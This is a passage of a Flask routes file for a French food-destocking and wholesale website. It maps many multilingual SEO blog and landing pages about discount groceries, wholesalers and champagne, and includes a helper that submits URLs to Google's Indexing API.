        description="Découvrez comment acheter du champagne Ruinart au meilleur prix : guide complet, bons plans et réductions."
    )

@app.route('/blog/destockage-alimentaire-belgique')
def destockage_belgique_article():
    return render_template(
        'destockage-belgique-article.html',
        title="Déstockage Alimentaire Belgique | Bons Plans 2025",
        description="Achetez en déstockage alimentaire en Belgique : produits à prix réduits et astuces pour économiser."
    )

@app.route('/blog/destockage-alimentaire-25-belgique')
def destockage_belgique_25_article():
    return render_template(
        'destockage-belgique-article-25.html',
        title="Déstockage Alimentaire Belgique 2025 | Économies & Offres",
        description="Profitez du déstockage alimentaire en Belgique en 2025 : bons plans et produits à prix réduits."
    )

@app.route('/blog/destockage-alimentaire-paris')
def destockage_paris_article():
    return render_template(
        'destockage-paris-article.html',
        title="Déstockage Alimentaire Paris | Économies & Bons Plans",
        description="Découvrez le déstockage alimentaire à Paris : produits invendus, fins de série et offres spéciales."
    )

@app.route('/blog/destockage-alimentaire-lille')
def destockage_lille_article():
    return render_template(
        'destockage-lille-article.html',
        title="Déstockage Alimentaire Lille | Bons Plans & Réductions",
        description="Trouvez les meilleures offres de déstockage alimentaire à Lille : produits à prix réduits et astuces économiques."
    )

@app.route('/blog/luxe-champagne-marques-prestigieuses')
def luxe_champagne_article():
    return render_template(
        'luxe-champagne-article.html',
        title="Champagne de Luxe | Marques Prestigieuses",
        description="Guide des champagnes de luxe : marques prestigieuses, prix, dégustation et bons plans pour collectionneurs et amateurs."
    )

@app.route('/blog/prix-nutella-tendances-astuces-economiser')
def prix_nutella_article():
    return render_template(
        'prix-nutella-article.html',
        title="Prix Nutella | Tendances & Astuces pour Économiser",
        description="Découvrez les prix du Nutella et nos astuces pour économiser sur vos achats tout en profitant des meilleures offres."
    )

@app.route('/blog/optimisation-magasin-distribution')
def optimisation_magasin_article():
    return render_template(
        'optimisation-magasin-article.html',
        title="Optimisation Magasin & Distribution | Stratégies Efficaces",
        description="Conseils pour optimiser votre magasin et votre distribution : approvisionnement, organisation et économies."
    )

@app.route('/blog/destockage-alimentaire-economiser-reduire-gaspillage')
def destockage_alimentaire_article():
    return render_template(
        'destockage-alimentaire-article.html',
        title="Déstockage Alimentaire | Économiser & Réduire le Gaspillage",
        description="Profitez du déstockage alimentaire pour économiser et lutter contre le gaspillage avec des produits de qualité."
    )


# Traitement du Formulaire
@app.route('/confirmation1')
def confirmation1():
    return render_template('confirmation1.html')

@app.route('/destockage-alimentaire-belgiqu092025')
def destockage_belgique092025():
    return render_template('destockage-belgique092025.html')
    
@app.route("/destockage-alimentaire-urgence-23mai2025")
def article_urgence():
    # Balises dynamiques pour Google
    contenu = render_template(
        "urgence_23mai2025.html",
        meta_title="🚨 DESTOCKAGE ALIMENTAIRE URGENCE 23 MAI 2025 : -80% SUR LES STOCKS 🇫🇷 | destockagealimentairestore.com",
        meta_description="➡️ ALERTE : Les distributeurs liquident leurs stocks alimentaires à -80% ce 23 mai 2025. Découvrez COMMENT en profiter AVANT tout le monde. ✅ Livraison 24h.",
        current_date=datetime.now().strftime("%Y-%m-%d")
    )
    # Force le cache client + compression
    reponse = make_response(contenu)
    reponse.headers['Cache-Control'] = 'public, max-age=3600'  # 1h de cache
    return reponse
    
@app.route('/presse')
def presse():
    return render_template('presse.html')

import requests
from datetime import datetime

def submit_to_google(url):
    """Soumet l'URL à l'index Google"""
    api_url = "https://indexing.googleapis.com/v3/urlNotifications:publish"
    
    payload = {
        "url": url,
        "type": "URL_UPDATED"
    }
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer [VOTRE_TOKEN_OAUTH]"
    }
    
    response = requests.post(api_url, json=payload, headers=headers)
    return response.json()

# Exemple pour chaque nouvel article
new_post_url = "https://destockagealimentairestore.com/blog/destockage-alimentaire-avantages"
submit_to_google(new_post_url)

@app.route('/destockage-professionnel')
def destockageprofessionnel():
    return render_template('destockage-professionnel.html')



@app.route('/blog/grossiste-alimentaire-bruxelles')
def grossiste_alimentaire_bruxelles():
    return render_template(
        'blog/grossiste-alimentaire-bruxelles.html',
        title="Grossiste Alimentaire Bruxelles | Fournisseurs & Déstockage",
        description="Trouvez les meilleurs grossistes alimentaires à Bruxelles : produits en gros, déstockage, prix compétitifs et fournisseurs locaux."
    )

@app.route('/blog/magasins-alimentation-bio-traditionnel')
def magasins_alimentation_bio_traditionnel():
    return render_template(
        'blog/magasins-alimentation-bio-traditionnel.html',
        title="Magasins Alimentation Bio & Traditionnelle | Guide Complet",
        description="Découvrez les meilleurs magasins d’alimentation bio et traditionnelle : produits locaux, sains et respectueux de l’environnement."
    )



@app.route('/destockage-en-gros')
def destockage_gros_fr():
    return render_template('destockage_gros_fr.html',
                         title=_("Destockage Alimentaire en Gros | Professionnels"),
                         meta_description=_("Destockage alimentaire en gros pour professionnels : restaurants, associations, commerces. Economisez jusqu'à 70% sur vos achats."))

@app.route('/palette-alimentaire-destockage')
def palette_destockage():
    return render_template('palette_destockage.html',
                         title=_("Palettes Alimentaires en Destockage - Jusqu'à -70%"),
                         meta_description=_("Palettes alimentaires complètes en destockage : lots de produits à prix wholesale. Idéal pour professionnels et associations."))

# Routes Belgique
@app.route('/be/destockage-alimentaire-belgique')
def destockage_be_fr():
    return render_template('destockage_be_fr.html',
                         title=_("Destockage Alimentaire en Belgique | Prix Discount"),
                         meta_description=_("Destockage alimentaire en Belgique pour particuliers et professionnels. Livraison rapide dans toute la Belgique."))

@app.route('/nos-fournisseurs')
def nosfournisseurs():
    return render_template('nos-fournisseurs.html')
@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/conditions-generales')
def conditions():
    return render_template('conditions.html')

@app.route('/grossiste-boissonbbelgique1')
def grossiste_boissonbelgique25():
    return render_template('grossiste_boissonbelgique2025.html')

@app.route('/grossiste-boisson09')
def grossiste_boisson09():
    return render_template('grossiste-boisson09.html')

@app.route('/grossiste-alimstore')
def grossiste_alimstore():
    return render_template('grossiste_alimstore.html')

@app.route('/grossisteboissonstore')
def grossiste_boissonstore():
    return render_template('grossiste_boissonstore.html')

@app.route('/grossisteboissonbelgiquestore')
def grossiste_boissonbelgiquestore():
    return render_template('grossiste_boissonbelgiquestore.html')

@app.route('/revolution-surplus-alimentaires-2025')
def revolution_surplus():
    return render_template('revolution_surplus.html',
                         current_date=datetime.now().strftime("%d/%m/%Y"))

@app.route('/metamorphose-distribution-2025')
def metamorphose_distribution():
    return render_template('metamorphose_distribution.html')

@app.route('/destockage-professionnel')
def destockage_professionnel():
    return render_template('destockage_professionnel.html')

@app.route('/trouver-magasins-pres-de-chez-vous')
def trouver_magasins():
    return render_template('trouver_magasins.html')

@app.route('/blog/supermarche-proximite')
def supermarche_proximite():
    return render_template('supermarche_proximite.html')

@app.route('/supermarche-ouvert-24-7')
def supermarche_24_7():
    return render_template('supermarche_24_7.html')

@app.route('/recettes-nutella')
def recettes_nutella():
    return render_template('recettes_nutella.html')

@app.route('/magasin-bio-local')
def magasin_bio_local():
    return render_template('magasin_bio_local.html')

@app.route('/grossiste-alimentaire-bruxellees')
def grossiste_alimentaire_belgique():
    return render_template('grossiste_alimentairebruxellee.html')

@app.route('/landi')
def landing_page():
    return render_template('landing_page.html')

@app.route('/belgique')
def belgique_page():
    return render_template('belgique.html')

@app.route('/boissons')
def boissons_page():
    return render_template('boissons.html')


@app.route('/espana')
def espana_page():
    return render_template('espana.html')


@app.route('/grossiste-alimentaire-belgique2025')
def grossiste_alimentaire_bruxelles_2025():
    return render_template('grossiste_alimentaire_belgique.html')

@app.route('/meilleurs-fournisseurs-aubervilliers-2025')
def fournisseurs_aubervilliers():
    return render_template('fournisseurs_aubervilliers.html')

@app.route('/distributeurs-automatiques-rentabilite-innovations')
def distributeurs_automatiques():
    return render_template('distributeurs_automatiques.html')

@app.route('/grossiste-boisson2025')
def grossiste_boisson25():
    return render_template('grossiste_boisson2025.html')

@app.route('/grossiste-alimentaire2025')
def grossiste_alimentaire2025():
    return render_template('grossiste_alimentaire2025.html')

@app.route('/grossiste-alimentaire-belgique2025')
def grossiste_belgique2025():
    return render_template('grossiste_belgique2025.html')

@app.route('/achat-destockage')
def achat_destockage():
    return render_template('achat-destockage.html')  # Le fichier contenant le code HTML ci-dessus

@app.route('/destockage-alimentaire-lille')
def destockage_lille():
    return render_template('destockage-lille.html')  # Le fichier contenant le code HTML ci-dessus

@app.route('/destockage-alimentaire-paris')
def destockage_paris():
    return render_template('destockage-paris.html')  # Le fichier contenant le code HTML ci-dessus

@app.route('/guide-grossistes-paris')
def guide_grossistes_paris():
    return render_template('guide_grossistes_paris.html')



# Route principale
@app.route('/grossiste-alimentaire-international')
def grossiste_international():
    return render_template('grossiste-international.html')

# Routes pour les versions internationales (hreflang)
@app.route('/be/grossiste-alimentaire-international')
def grossiste_belgique():
    return render_template('grossiste-international.html')  # Même contenu ou version adaptée

@app.route('/ch/grossiste-alimentaire-international')
def grossiste_suisse():
    return render_template('grossiste-international.html')  # Même contenu ou version adaptée

@app.route('/es/mayorista-alimentario-internacional')
def grossiste_espagne():
    return render_template('grossiste-espagnol.html')  # Version en espagnol


@app.route('/guide-des-soldes-alimentaires')
def guide_soldes_alimentaires():
    return render_template('guide_soldes_alimentaires.html')
@app.route('/mayorista-alimentos-espana')
def mayorista_espana():
    return render_template('mayorista_espana.html')

@app.route('/grossiste-alimentaire-france')
def grossiste_france():
    return render_template('grossiste_france.html')


@app.route('/grossista-alimentare-italia')
def grossista_italia():
    return render_template('grossista_italia.html')

@app.route('/champagne-destockage')
def champagne_destockage():
    return render_template('champagne_destockage.html')

@app.route('/canette-coca-histoire-innovation')
def canette_coca():
    return render_template('canette_coca.html')

@app.route('/blog/astuces-achats-produits-destockes')
def astuces_destockage():
    return render_template('astuces_achats_produits_destockes.html')

@app.route('/blog/anti-gaspi-creatif')
def anti_gaspi():
    return render_template('anti_gaspi_creatif.html')

@app.route('/comprar-alimentos-por-mayor-espana')
def alimentos_por_mayor():
    return render_template('alimentos_por_mayor.html')


@app.route('/grossistes-alimentaires-paris-2023')
def grossistes_paris_2023():
    """Page article sur les grossistes alimentaires à Paris"""
    meta = {
        'title': 'Top Grossistes Alimentaires à Paris 2023 | Destockage Alimentaire',
        'description': 'Découvrez les meilleurs grossistes alimentaires à Paris en 2023. Guide complet pour professionnels de la restauration avec Rungis, Transgourmet, Pomona et Métro.',
        'keywords': 'grossistes alimentaires paris, rungis, transgourmet, pomona, metro, restauration paris, produits frais, grossiste alimentaire',
        'canonical': 'https://destockagealimentairestore.com/grossistes-alimentaires-paris-2023'
    }
    return render_template('grossistes-paris-2023.html', meta=meta)


@app.route('/astuces-economie-alimentation')
def astuces_economie_alimentation():
    """Page article sur les astuces pour économiser sur l'alimentation"""
    meta = {
        'title': 'Les meilleures astuces pour économiser sur l\'alimentation | Destockage Alimentaire',
        'description': 'Découvrez nos astuces pour réduire votre budget alimentaire : magasins de déstockage, planification des repas, achats en gros et bonnes habitudes alimentaires.',
        'keywords': 'économiser alimentation, astuces économie, déstockage alimentaire, budget courses, réduire dépenses alimentaires',
        'canonical': 'https://destockagealimentairestore.com/astuces-economie-alimentation'
    }
    return render_template('astuces-economie-alimentation.html', meta=meta)


@app.route('/avantages-grossiste-boisson')
def avantages_grossiste_boisson():
    """Page article sur les avantages de choisir un grossiste boisson"""
    meta = {
        'title': 'Les avantages de choisir un grossiste boisson | Destockage Alimentaire',
        'description': 'Découvrez les nombreux avantages de choisir un grossiste boisson pour optimiser votre approvisionnement. Profitez de tarifs compétitifs et d\'une large gamme de produits adaptés à vos besoins, que vous soyez à Bruxelles ou ailleurs en Belgique.',
        'keywords': 'grossiste boisson, boissons Bruxelles, grossiste Belgique, approvisionnement boissons, tarifs compétitifs boissons',
        'canonical': 'https://destockagealimentairestore.com/avantages-grossiste-boisson'
    }
    return render_template('avantages-grossiste-boisson.html', meta=meta)

@app.route('/destockage-alimentaire-belgique-guide')
def destockage_belgique_guide():
    """Guide complet du destockage alimentaire en Belgique"""
    meta = {
        'title': 'Guide Ultime du Destockage Alimentaire en Belgique 2023 | Economisez Jusqu\'à 70%',
        'description': 'Découvrez le guide complet du destockage alimentaire en Belgique. Où trouver les meilleures offres, comment économiser jusqu\'à 70% sur vos courses et toutes les astuces pour profiter des surplus de qualité.',
        'keywords': 'destockage alimentaire Belgique, magasins destockage, surplus alimentaire, économiser courses, produits discount Belgique, destockage professionnel',
        'canonical': 'https://destockagealimentairestore.com/destockage-alimentaire-belgique-guide'
    }
    return render_template('destockage-alimentaire-belgique-guide.html', meta=meta)

@app.route('/avantages-destockage-local')
def avantages_destockage_local():
    """Page article sur les avantages du déstockage alimentaire local"""
    meta = {
        'title': 'Les avantages du déstockage alimentaire local | Destockage Alimentaire',
        'description': 'Découvrez les nombreux avantages du déstockage alimentaire local : économies, écologie, et soutien à l\'économie locale. Une solution gagnante pour tous.',
        'keywords': 'destockage alimentaire, avantages déstockage, économies alimentaires, gaspillage alimentaire, consommation locale',
        'canonical': 'https://destockagealimentairestore.com/avantages-destockage-local'
    }
    return render_template('avantages-destockage-local.html', meta=meta)

@app.route('/tendances-distribution')
def tendances_distribution():
    """Page article sur les tendances actuelles dans la distribution"""
    meta = {
        'title': 'Les tendances actuelles dans la distribution | Destockage Alimentaire',
        'description': 'Découvrez les tendances actuelles dans la distribution : e-commerce, réseaux de distribution, transformation des magasins physiques, durabilité et impact technologique.',
        'keywords': 'tendances distribution, commerce de détail, e-commerce, réseaux distribution, magasins physiques, durabilité distribution, technologie distribution',
        'canonical': 'https://destockagealimentairestore.com/tendances-distribution'
    }
    return render_template('tendances-distribution.html', meta=meta)



@app.route('/achat-boisson-gros')
def achat_boisson_gros():
    """Page article sur l'achat de boissons en gros"""
    meta = {
        'title': 'Achat Boisson en Gros: Guide Ultime et Astuces | Destockage Alimentaire',
        'description': 'Découvrez comment acheter des boissons en gros peut vous faire économiser de l\'argent, avec des conseils sur le choix du bon grossiste et l\'optimisation des achats pour les particuliers et professionnels.',
        'keywords': 'achat boisson en gros, grossiste boisson, boissons pas cher, économiser sur boissons, guide achat boissons',
        'canonical': 'https://destockagealimentairestore.com/achat-boisson-gros'
    }
    return render_template('achat-boisson-gros.html', meta=meta)


@app.route('/grossistes-alimentaires-paris-2023')
def grossistes_alimentaires_paris_2023():
    """Page article sur les meilleurs grossistes alimentaires à Paris"""
    meta = {
        'title': 'Top Grossistes Alimentaires à Paris 2023 | Destockage Alimentaire',
        'description': 'Découvrez les meilleurs grossistes alimentaires à Paris en 2023. Guide complet pour professionnels de la restauration avec Rungis, Transgourmet, Pomona et Métro.',
        'keywords': 'grossistes alimentaires paris, rungis, transgourmet, pomona, metro, restauration paris, produits frais, grossiste alimentaire',
        'canonical': 'https://destockagealimentairestore.com/grossistes-alimentaires-paris-2023'
    }
    return render_template('grossistes-alimentaires-paris-2023.html', meta=meta)


@app.route('/destockage-alimentaire-paris')
def destockage_alimentaire_paris():
    """Page dédiée au déstockage alimentaire à Paris"""
    meta = {
        'title': 'Destockage Alimentaire Paris | Grossiste Destockage Professionnel',
        'description': 'Déstockage alimentaire à Paris : produits de qualité à prix réduits jusqu\'à -70%. Livraison rapide pour professionnels et particuliers. Commandez en ligne!',
        'keywords': 'destockage alimentaire Paris, grossiste alimentaire Paris, produits alimentaires pas chers, destockage professionnel, surplus alimentaire, liquidation stock Paris',
        'canonical': 'https://destockagealimentairestore.com/destockage-alimentaire-paris'
    }
    return render_template('destockage-alimentaire-paris.html', meta=meta)

@app.route('/destockage-alimentaire-lille')
def destockage_alimentaire_lille():
    """Page article sur le destockage alimentaire à Lille"""
    meta = {
        'title': 'Destockage Alimentaire Lille: Guide Complet 2023 | Économisez jusqu\'à 70%',
        'description': 'Découvrez les meilleures adresses de destockage alimentaire à Lille. Guide complet pour professionnels et particuliers pour économiser jusqu\'à 70% sur vos achats alimentaires.',
        'keywords': 'destockage alimentaire Lille, produits alimentaires discount Lille, économiser alimentation Lille, surplus alimentaire Lille, destockage professionnel Lille',
        'canonical': 'https://destockagealimentairestore.com/destockage-alimentaire-lille'
    }
    return render_template('destockage-alimentaire-lille.html', meta=meta)


@app.route('/initiatives-destockage-alimentaire')
def initiatives_destockage_alimentaire():
    """Page article sur les initiatives de déstockage alimentaire en France"""
    meta = {
        'title': 'Initiatives de Déstockage Alimentaire en France | Anti-Gaspillage et Économies',
        'description': 'Découvrez comment les initiatives de déstockage alimentaire en France permettent de réduire le gaspillage tout en offrant des produits de qualité à prix réduits.',
        'keywords': 'destockage alimentaire France, anti-gaspillage, économies alimentaires, déstockage en ligne, gaspillage alimentaire',
        'canonical': 'https://destockagealimentairestore.com/initiatives-destockage-alimentaire'
    }
    return render_template('initiatives-destockage-alimentaire.html', meta=meta)


@app.route('/optimiser-magasin-distribution')
def optimiser_magasin_distribution():
    """Page article sur l'optimisation des magasins de distribution"""
    meta = {
        'title': 'Comment optimiser votre magasin de distribution | Guide Complet 2023',
        'description': 'Découvrez les stratégies pour optimiser votre magasin de distribution : gestion de stock, agencement, expérience client et intégration numérique. Guide complet pour augmenter votre rentabilité.',
        'keywords': 'optimisation magasin distribution, gestion stock, agencement magasin, expérience client, commerce numérique, stratégie distribution',
        'canonical': 'https://destockagealimentairestore.com/optimiser-magasin-distribution'
    }
    return render_template('optimiser-magasin-distribution.html', meta=meta)



@app.after_request
def add_header(response):
    response.cache_control.max_age = 86400  # 1 jour
    return response

@app.route('/blog/france-degockage-alimentaire')
def blog_france():
    return render_template('blog_france.html')

@app.route('/article-ultra')
def article_ultra():
    return render_template('article_ultra.html')

@app.route('/homex')
def accueil():
    return render_template('accueil.html')

@app.route('/destockage-alimentaire-belgique')
def destockage_belgique():
    return render_template('destockage_belgique.html') 

@app.route('/destockage-alimentario-espana')
def destockage_espana():
    return render_template('destockage_espana.html') 

@app.route('/blog/espana-descuentos-alimentarios')
def blog_espagne():
    return render_template('blog_espagne.html')

@app.route("/trafficbelge")
def trafficbelge():
    return render_template("trafficbelge.html")


@app.route('/destockage-alimentaire-belgique2025')
def destockage_alimentaire2025():
    return render_template('destockage-alimentaire-belgique2025.html')

@app.route('/horarios-supermercados')
def horarios():
    return render_template('horarios.html')

@app.route('/guide-boissons-en-gros25')
def guide_boissons25():
    return render_template('guide_boissons25.html')


@app.route("/groothandel-horeca")
def groothandel_horeca():
    return render_template("destockagealimentairestore_index.html")

@app.route("/destockbelge")
def destockbelge():
    return render_template("destockbelge.html")

@app.route('/distributeur-automatique-alimentaire25')
def distributeur_automatique25():
    return render_template('distributeur_automatique25.html')

@app.route('/promotion-lait')
def promotion_lait():
    title = "PROMOTION LAIT: Offres Imbattables Cette Semaine"
    supermarkets = [
        {
            'name': 'Carrefour',
            'description': 'Diversité et Accessibilité - Offres attractives sur les packs de lait entier, laits bio ou sans lactose.'
        },
        {
            'name': 'Intermarché',
            'description': 'Remises et Offres Spéciales - Promotions "un acheté, un offert" et réductions avec cartes de fidélité.'
        },
        {
            'name': 'Leclerc',
            'description': 'Prix Compétitifs - Remises sur grandes marques et marques distributeur avec programmes de fidélité.'
        }
    ]

    tips = [
        "Comparaison active des prix avec applications mobiles",
        "Achat en gros lors des promotions exceptionnelles",
        "Utilisation maximale des coupons de réduction",
        "Suivi des réseaux sociaux pour offres en temps réel"
    ]

    market_trends = [
        "Hausse des coûts de production (énergie, alimentation animale)",
        "Influence croissante des laits végétaux sur le marché",
        "Variabilité saisonnière des prix (pics en période estivale)"
    ]

    return render_template(
        'promotion_lait.html',
        title=title,
        supermarkets=supermarkets,
        tips=tips,
        market_trends=market_trends
    )
    
@app.route('/destockagefranceparis')
def destockagefranceparis():
    return render_template(
        'destockagemagic.html',
        title="Déstockage Alimentaire Paris | Bons Plans & Économies en France",
        description="Découvrez le déstockage alimentaire à Paris et en France. Produits pas chers, invendus et fins de séries pour économiser jusqu'à 70%."
    )

@app.route('/avantages-hard-discount')
def avantages():
    return render_template(
        'avantages.html',
        title="Avantages du Hard Discount | Courses à Petits Prix",
        description="Quels sont les avantages du hard discount ? Profitez de réductions, bons plans alimentaires et produits de qualité à prix cassés."
    )

@app.route('/grossistes-aubervilliers25')
def grossistes25():
    return render_template(
        'grossistes25.html',
        title="Grossistes Aubervilliers | Fournisseurs & Déstockage",
        description="Trouvez les meilleurs grossistes à Aubervilliers : alimentation, textile, halal et produits divers à prix de gros."
    )

@app.route('/grossiste-halal')
def halal_guide():
    return render_template(
        'halal_guide.html',
        title="Grossiste Halal | Fournisseurs Alimentaires Halal",
        description="Guide complet des grossistes halal : alimentation certifiée, viandes, boissons et produits en gros pour particuliers et professionnels."
    )

@app.route('/grossiste-halal25')
def halal_guide25():
    return render_template(
        'halal_guide25.html',
        title="Grossiste Halal France 2025 | Déstockage & Prix de Gros",
        description="Découvrez les grossistes halal en France en 2025 : viandes, épicerie et boissons halal à prix compétitifs."
    )

@app.route('/choosing-the-right-ecommerce-supplier')
def supplier_guide():
    return render_template(
        'supplier_guide.html',
        title="Choosing the Right E-commerce Supplier | Business Guide",
        description="Learn how to choose the best e-commerce supplier: quality, reliability, pricing and logistics for successful online business."
    )

@app.route('/beneficios-aceite-oliva')
def aceite_oliva():
    return render_template(
        'aceite_oliva.html',
        title="Beneficios del Aceite de Oliva | Salud y Cocina",
        description="Descubre los beneficios del aceite de oliva para la salud y la cocina: antioxidantes, vitaminas y sabor mediterráneo."
    )

@app.route('/beneficios-aceite-oliva25')
def aceite_oliva25():
    return render_template(
        'aceiteoliva.html',
        title="Beneficios del Aceite de Oliva 2025 | Nutrición & Bienestar",
        description="Aceite de oliva en 2025: beneficios actualizados, usos en la dieta mediterránea y propiedades saludables."
    )

@app.route('/explorando-bebidas-alcoholicas')
def bebidas_alcoholicas():
    return render_template(
        'bebidasalcoholicas.html',
        title="Explorando Bebidas Alcohólicas | Guía & Tendencias",
        description="Explora las principales bebidas alcohólicas: vinos, cervezas, licores y nuevas tendencias en el mercado."
    )

@app.route('/role-grossiste-alimentaire')
def article_role_grossiste_clean():
    return render_template(
        'article_role_grossiste.html',
        title="Rôle du Grossiste Alimentaire | Distribution & Logistique",
        description="Comprenez le rôle essentiel du grossiste alimentaire : approvisionnement, distribution et déstockage pour professionnels."
    )

@app.route('/destockage-belgique')
def destockage_belgique_clean():
    return render_template(
        'destockage--belgique.html',
        title="Déstockage Alimentaire Belgique | Bons Plans 2025",
        description="Achetez en déstockage alimentaire en Belgique : réductions sur invendus, produits en gros et anti-gaspillage."
    )

@app.route('/grossiste-paris')
def grossiste_paris():
    return render_template(
        'grossiste-paris.html',
        title="Grossistes à Paris | Fournisseurs Alimentaires & Déstockage",
        description="Découvrez les grossistes alimentaires et non alimentaires à Paris. Produits à prix de gros pour particuliers et pros."
    )

@app.route('/blog/alimentation-bio')
def blog_alimentation_bio():
    return render_template(
        'blog/alimentation-bio.html',
        title="Alimentation Bio | Tendances et Produits Sains",
        description="Tout savoir sur l’alimentation bio : avantages santé, labels, conseils et produits de qualité pour mieux consommer."
    )

@app.route('/blog/produits-italiens')
def blog_produits_italiens():
    return render_template(
        'blog/produits-italiens.html',
        title="Produits Italiens | Gastronomie & Importation",
        description="Découvrez les meilleurs produits italiens : pâtes, fromages, charcuterie, vins et spécialités importées."
    )

@app.route('/blog/destockage-alimentaire-belgique')
def destockage_belgique_2025():
    return render_template(
        'blog/destockage-belgique.html',
        title="Déstockage Alimentaire Belgique 2025 | Réductions & Économies",
        description="Profitez du déstockage alimentaire en Belgique en 2025 : produits à prix réduits, anti-gaspillage et promotions."
    )

@app.route('/blog/achat-ruinart')
def achat_ruinart():
    return render_template(
        'blog/achat-ruinart.html',
        title="Achat Champagne Ruinart | Prix & Bons Plans",
        description="Achetez du champagne Ruinart en ligne : prix avantageux, promotions et déstockage pour particuliers et professionnels."
    )

@app.route('/blog/champagne-en-gros')
def champagne_en_gros():
    return render_template(
        'blog/champagne-en-gros.html',
        title="Champagne en Gros | Grossistes & Fournisseurs",
        description="Trouvez du champagne en gros : fournisseurs, grossistes et prix déstockés pour événements et revendeurs."
    )

@app.route('/blog/prix-champagne')
def prix_champagne():
    return render_template(
        'blog/prix-champagne.html',
        title="Prix du Champagne 2025 | Guide & Comparatif",
        description="Découvrez les prix du champagne en 2025 : comparatif des marques Ruinart, Dom Pérignon, Bollinger et plus."
    )

@app.route('/blog/discount1-alimentation-astuces')
def discount_alimentation_astuces1():
    return render_template(
        'blog/discount-alimentation-astuces1.html',
        title="Astuces Discount Alimentation | Bons Plans & Économies",
        description="Nos astuces discount pour économiser sur l’alimentation : déstockage, dates courtes, hard discount et promos."
    )

@app.route('/blog/dom-perignon-prix')
def dom_perignon_prix():
    return render_template(
        'blog/dom-perignon-prix.html',
        title="Prix Dom Pérignon | Guide & Bons Plans",
        description="Découvrez le prix du champagne Dom Pérignon selon les cuvées et les millésimes. Bons plans et réductions."
    )

@app.route('/blog/dom-perignon-2012')
def dom_perignon_2012():
    return render_template(
        'blog/dom-perignon-2012.html',
        title="Dom Pérignon 2012 | Prix, Dégustation & Avis",
        description="Tout savoir sur le Dom Pérignon 2012 : caractéristiques, prix, notes de dégustation et où l’acheter moins cher."
    )

@app.route('/blog/nutella-750g-recettes')
def nutella_recettes():
    return render_template(
        'blog/nutella-750g-recettes.html',
        title="Recettes Nutella 750g | Idées Gourmandes",
        description="Découvrez des recettes gourmandes avec le pot de Nutella 750g : desserts, gâteaux et idées créatives."
    )

@app.route('/blog/champagne-ruinart')
def champagne_ruinart():
    return render_template(
        'blog/champagne-ruinart.html',
        title="Champagne Ruinart | Prix & Dégustation",
        description="Découvrez le champagne Ruinart : prix, cuvées, dégustation et bons plans pour acheter moins cher."
    )

@app.route('/blog/dom-perignon')
def dom_perignon():
    return render_template(
        'blog/dom-perignon.html',
        title="Champagne Dom Pérignon | Guide Complet",
        description="Tout savoir sur le champagne Dom Pérignon : histoire, prix, cuvées et où l’acheter au meilleur tarif."
    )

@app.route('/blog/grossistes-boissons-2023')
def grossistes_boissons_2023():
    return render_template(
        'blog/grossistes-boissons-2025.html',
        title="Grossistes Boissons 2025 | Fournisseurs & Prix",
        description="Trouvez les meilleurs grossistes en boissons en 2025 : alcools, sodas et eaux à prix de gros."
    )

@app.route('/blog/dom-perignon-champagne-luxe')
def dom_perignon_champagne():
    return render_template(
        'blog/dom-perignon-champagne-luxe.html',
        title="Dom Pérignon Champagne de Luxe | Prix & Dégustation",
        description="Dom Pérignon, champagne de luxe par excellence : prix, dégustation, millésimes et bons plans."
    )

@app.route('/blog/champagne25-ruinart')
def champagne_ruinart25():
    return render_template(
        'blog/champagne-ruinart25.html',
        title="Champagne Ruinart 2025 | Prix & Bons Plans",
        description="Achetez du champagne Ruinart en 2025 : prix, promotions et déstockage pour particuliers et événements."
    )

@app.route('/blog/ruinart-brut-champagne')
def ruinart_brut_champagne():
    return render_template(
        'blog/ruinart-brut-champagne.html',
        title="Ruinart Brut | Champagne d’Exception",
        description="Découvrez le champagne Ruinart Brut : prix, caractéristiques, accords mets-vins et avis de dégustation."
    )

@app.route('/blog/distribution-alimentaire-belgique')
def distribution_alimentaire_belgique():
    return render_template(
        'blog/distribution-alimentaire-belgique.html',
        title="Distribution Alimentaire Belgique | Grossistes & Déstockage",
        description="Distribution alimentaire en Belgique : fournisseurs, grossistes et déstockage pour professionnels et particuliers."
    )

@app.route('/blog/grossiste-alimentaire-belgique-2025')
def grossiste_alimentaire_belgique_2025():
    return render_template(
        'blog/grossiste-alimentaire-belgique-2025.html',
        title="Grossiste Alimentaire Belgique 2025 | Fournisseurs & Prix",
        description="Découvrez les grossistes alimentaires en Belgique en 2025 : prix, déstockage et tendances du marché."
    )


    
@app.route('/fr/destockage')
def destockage_fr():
    return render_template('destockage_fr.html',
                         title="Destockage Alimentaire Belgique -80%",
                         video_id="ABC123xyz",
                         cities=["Bruxelles", "Liège", "Charleroi"])

@app.route('/destockageb')
def destockage_bb():
    return render_template('destockage_b.html',
                         title="Destockage Alimentaire Belgique -80%",
                         video_id="ABC123xyz",
                         cities=["Bruxelles", "Liège", "Charleroi"])

@app.route('/nl/destockage')
def destockage_nl():
    return render_template('destockage_nl.html',
                         title="Voedingsdestockage België -80%",
                         video_id="DEF456uvw",
                         cities=["Antwerpen", "Gent", "Brugge"])

@app.route('/en/surplus')
def surplus_en():
    return render_template('surplus_en.html',
                         title="Food Surplus Belgium -80%",
                         video_id="GHI789rst",
                         cities=["Brussels", "Antwerp", "Liège"])
@app.route('/blog/belgique-bon-marche-nourriture')
def blog_belgique():
    return render_template('blog_belgique.html')

@app.route('/blog/suisse-pas-cher-nourriture')
def blog_suisse():
    return render_template('blog_suisse.html')


@app.route('/discount-alimentaire-economies-astuces')
def discount_alimentaire_astuces():
    return render_template('discount-alimentaire-astuces.html')  # Le fichier contenant le code HTML ci-dessus

@app.route('/discount-alimentaire-guide-ultime-2025')
def discount_alimentaire_ultime():
    return render_template('discount-alimentaire-ultime.html')


@app.route('/innovations-2025-distribution-boissons-modernisee')
def innovations_boissons():
    return render_template("innovations-2025-distribution-boissons.html")

@app.route('/destockage-date-courte-anti-gaspillage-2025')
def destockage_date_courte():
    return render_template('destockage-date-courte.html')

@app.route('/grossiste-alimentation-halal-choisir-fournisseur-25')
def grossiste_halal():
    return render_template('grossiste_halal_2025.html')

@app.route('/groothandel-voor-horeca')
def groothandel_horeca_25():
    return render_template('groothandel_horeca.html')

@app.route('/grossistes-alimentaires-bruxelles-2025')
def grossistes_bruxelles():
    return render_template('grossistes-25-bruxelles.html')
    
@app.route('/blog/soldes-alimentaires')
def blog_soldes_alimentaires():
    return render_template('blog/soldes-alimentaires.html')

@app.route('/blog/anti-gaspillage')
def blog_anti_gaspillage():
    return render_template('blog/anti-gaspillage.html')

@app.route('/blog/grossiste-halal')
